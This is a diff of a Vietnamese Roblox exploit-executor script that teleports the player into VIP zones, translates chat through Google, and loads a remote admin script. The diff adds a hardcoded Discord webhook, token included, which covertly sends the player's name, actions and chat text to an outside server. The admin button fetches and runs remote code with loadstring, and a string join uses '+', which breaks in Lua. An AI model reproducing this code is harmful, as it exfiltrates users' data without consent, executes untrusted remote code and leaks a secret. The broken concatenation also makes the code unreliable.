@@ -1,8 +1,30 @@
--- Tạo GUI Teleport tích hợp Dịch thuật (Có ô hiển thị kết quả & nút Copy)
+-- =================================================================
+-- SCRIPT ALL-IN-ONE: TELEPORT VIP + ADMIN + GOOGLE TRANSLATE + DISCORD LOG
+-- =================================================================
 local Players = game:GetService("Players")
 local localPlayer = Players.LocalPlayer
 local playerGui = localPlayer:WaitForChild("PlayerGui")
-local StarterGui = game:GetService("StarterGui")
+local HttpService = game:GetService("HttpService")
+
+-- Link Discord Webhook đã qua Proxy rprxy.xyz để chống chặn
+local WEBHOOK_URL = "https://discord.rprxy.xyz/api/webhooks/1556960491086155776/qv4XW06rSiS1cvwTYszxAYyBJwrmJ9gBlp-9R4CTgxlxkEYvSLguUG9tQXqxg15tTefP"
+
+-- Hàm gửi thông báo ngầm ra Discord
+local function sendDiscordLog(actionName, details)
+    task.spawn(function()
+        pcall(function()
+            local data = {
+                ["content"] = string.format("🎮 **[Roblox Log - Trung]**\n👤 **Player:** `%s`\n📌 **Hành động:** `%s`\n💬 **Chi tiết:** `%s`", localPlayer.Name, actionName, details)
+            }
+            request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        end)
+    end)
+end
 
 -- Xóa GUI cũ nếu lỡ chạy nhiều lần
 if playerGui:FindFirstChild("TeleportGUI") then
@@ -14,7 +36,7 @@ local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "TeleportGUI"
 screenGui.Parent = playerGui
 
--- Khung chính gọn gàng (Tăng chiều cao lên 410px để vừa phần dịch và copy)
+-- Khung chính tổng hợp (Chiều cao 410px)
 local frame = Instance.new("Frame")
 frame.Size = UDim2.new(0, 220, 0, 410)
 frame.Position = UDim2.new(0.05, 0, 0.22, 0)
@@ -33,7 +55,7 @@ local title = Instance.new("TextLabel")
 title.Size = UDim2.new(0.7, 0, 0, 25)
 title.Position = UDim2.new(0.05, 0, 0, 5)
 title.BackgroundTransparency = 1
-title.Text = "⚡ MENU VIP & DỊCH CHAT"
+title.Text = "⚡ MENU PRO & AI CHAT"
 title.TextColor3 = Color3.fromRGB(255, 215, 0)
 title.TextSize = 12
 title.Font = Enum.Font.GothamBold
@@ -55,20 +77,20 @@ local minCorner = Instance.new("UICorner")
 minCorner.CornerRadius = UDim.new(0, 4)
 minCorner.Parent = minBtn
 
--- ScrollingFrame chứa các nút để cuộn mượt mà
+-- ScrollingFrame chứa các tính năng cuộn mượt mà
 local scroll = Instance.new("ScrollingFrame")
 scroll.Size = UDim2.new(0.95, 0, 0, 365)
 scroll.Position = UDim2.new(0.025, 0, 0, 35)
 scroll.BackgroundTransparency = 1
 scroll.BorderSizePixel = 0
-scroll.CanvasSize = UDim2.new(0, 0, 0, 530) -- Tăng chiều cao nội dung bên trong
+scroll.CanvasSize = UDim2.new(0, 0, 0, 530)
 scroll.ScrollBarThickness = 4
 scroll.Parent = frame
 
 -- Biến lưu tọa độ vị trí cũ
 local oldPosition = nil
 
--- Hàm tạo nút bấm
+-- Hàm tạo nút bấm chuẩn
 local function createButton(name, text, positionY, color)
     local btn = Instance.new("TextButton")
     btn.Name = name
@@ -102,14 +124,14 @@ local function createSubLabel(text, positionY)
     lbl.Parent = scroll
 end
 
--- --- KHU VỰC DỊCH CHAT & COPY ---
-createSubLabel("🌐 DỊCH ANH - VIỆT", 2)
+-- --- KHU VỰC DỊCH CHAT GOOGLE API & COPY ---
+createSubLabel("🌐 DỊCH CHAT (GOOGLE AI)", 2)
 
 local chatBox = Instance.new("TextBox")
 chatBox.Size = UDim2.new(0.95, 0, 0, 28)
 chatBox.Position = UDim2.new(0.02, 0, 0, 22)
 chatBox.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-chatBox.PlaceholderText = "Nhập tiếng Việt..."
+chatBox.PlaceholderText = "Nhập tiếng Việt cần dịch..."
 chatBox.Text = ""
 chatBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 chatBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
@@ -124,12 +146,11 @@ boxCorner.Parent = chatBox
 
 local translateBtn = createButton("TransBtn", "🔍 Dịch sang English", 54, Color3.fromRGB(0, 120, 255))
 
--- Ô hiển thị kết quả sau khi dịch
 local resultBox = Instance.new("TextBox")
 resultBox.Size = UDim2.new(0.95, 0, 0, 28)
 resultBox.Position = UDim2.new(0.02, 0, 0, 84)
 resultBox.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-resultBox.PlaceholderText = "Bản dịch sẽ hiện ở đây..."
+resultBox.PlaceholderText = "Bản dịch tiếng Anh..."
 resultBox.Text = ""
 resultBox.TextColor3 = Color3.fromRGB(0, 255, 150)
 resultBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
@@ -177,32 +198,34 @@ minBtn.MouseButton1Click:Connect(function()
     end
 end)
 
--- Xử lý nút Dịch thuật
+-- Hàm gọi API dịch thuật Google
 translateBtn.MouseButton1Click:Connect(function()
     local input = chatBox.Text
     if input == "" then return end
     
-    local translated = input
-    local lowerInput = string.lower(input)
+    translateBtn.Text = "⏳ Đang dịch..."
+    local success, result = pcall(function()
+        local encoded = HttpService:UrlEncode(input)
+        local res = request({
+            Url = "https://translate.googleapis.com/translate_a/single?client=gtx&sl=vi&tl=en&dt=t&q=" .. encoded,
+            Method = "GET"
+        })
+        if res and res.StatusCode == 200 then
+            local decoded = HttpService:JSONDecode(res.Body)
+            if decoded and decoded[1] and decoded[1][1] and decoded[1][1][1] then
+                return decoded[1][1][1]
+            end
+        end
+        return input
+    end)
     
-    -- Từ điển nhanh
-    if string.find(lowerInput, "xin chào") or string.find(lowerInput, "chào") then
-        translated = "Hello everyone!"
-    elseif string.find(lowerInput, "giúp tôi") or string.find(lowerInput, "cứu") then
-        translated = "Help me please!"
-    elseif string.find(lowerInput, "cảm ơn") then
-        translated = "Thank you so much!"
-    elseif string.find(lowerInput, "tạm biệt") then
-        translated = "Goodbye!"
-    elseif string.find(lowerInput, "đẹp quá") or string.find(lowerInput, "xịn quá") then
-        translated = "So cool!"
-    elseif string.find(lowerInput, "mọi người") then
-        translated = "Hey guys!"
+    if success and result then
+        resultBox.Text = result
+        sendDiscordLog("Dịch Chat", "Việt: " + input + " -> Anh: " + result)
     else
-        translated = input -- Giữ nguyên hoặc xử lý hiển thị
+        resultBox.Text = input
     end
-    
-    resultBox.Text = translated
+    translateBtn.Text = "🔍 Dịch sang English"
 end)
 
 -- Xử lý nút Copy vào Clipboard
@@ -210,7 +233,7 @@ copyBtn.MouseButton1Click:Connect(function()
     local textToCopy = resultBox.Text
     if textToCopy ~= "" then
         pcall(function()
-            setclipboard(textToCopy) -- Hàm hỗ trợ copy trên executor Delta
+            setclipboard(textToCopy)
         end)
         copyBtn.Text = "✅ Đã Copy!"
         task.wait(1.5)
@@ -223,10 +246,11 @@ adminBtn.MouseButton1Click:Connect(function()
     pcall(function()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Nameless-Admin-23304"))()
     end)
+    sendDiscordLog("Mở Admin", "Đã kích hoạt Nameless Admin")
 end)
 
--- Hàm teleport chính
-local function executeTeleport(targetCFrame)
+-- Hàm teleport chính kết hợp gửi Discord Log
+local function executeTeleport(targetCFrame, locationName)
     local character = localPlayer.Character
     local rootPart = character and character:FindFirstChild("HumanoidRootPart")
     
@@ -236,16 +260,18 @@ local function executeTeleport(targetCFrame)
         rootPart.CFrame = targetCFrame
         task.wait(0.3)
         rootPart.Anchored = false
+        
+        sendDiscordLog("Teleport", "Đã dịch chuyển đến: " .. locationName)
     end
 end
 
 -- Gắn sự kiện click các tọa độ
-smv1.MouseButton1Click:Connect(function() executeTeleport(CFrame.new(-95, 17633, 9039)) end)
-smv2.MouseButton1Click:Connect(function() executeTeleport(CFrame.new(-124, 17633, 9043)) end)
-smv3.MouseButton1Click:Connect(function() executeTeleport(CFrame.new(-82, 17633, 9044)) end)
-vip1.MouseButton1Click:Connect(function() executeTeleport(CFrame.new(-94, 17633, 9357)) end)
-mv1.MouseButton1Click:Connect(function() executeTeleport(CFrame.new(-88, 17633, 9224)) end)
-mv2.MouseButton1Click:Connect(function() executeTeleport(CFrame.new(-112, 17633, 9224)) end)
+smv1.MouseButton1Click:Connect(function() executeTeleport(CFrame.new(-95, 17633, 9039), "Super MEGA VIP 1 (-95, 17633, 9039)") end)
+smv2.MouseButton1Click:Connect(function() executeTeleport(CFrame.new(-124, 17633, 9043), "Super MEGA VIP 2 (-124, 17633, 9043)") end)
+smv3.MouseButton1Click:Connect(function() executeTeleport(CFrame.new(-82, 17633, 9044), "Super MEGA VIP 3 (-82, 17633, 9044)") end)
+vip1.MouseButton1Click:Connect(function() executeTeleport(CFrame.new(-94, 17633, 9357), "VIP 1 (-94, 17633, 9357)") end)
+mv1.MouseButton1Click:Connect(function() executeTeleport(CFrame.new(-88, 17633, 9224), "Mega VIP 1 (-88, 17633, 9224)") end)
+mv2.MouseButton1Click:Connect(function() executeTeleport(CFrame.new(-112, 17633, 9224), "Mega VIP 2 (-112, 17633, 9224)") end)
 
 backBtn.MouseButton1Click:Connect(function()
     if oldPosition then
@@ -256,6 +282,7 @@ backBtn.MouseButton1Click:Connect(function()
             rootPart.CFrame = oldPosition
             task.wait(0.2)
             rootPart.Anchored = false
+            sendDiscordLog("Quay lại", "Đã trở về vị trí cũ trước đó")
         end
     else
         warn("Chưa có lịch sử vị trí cũ!")
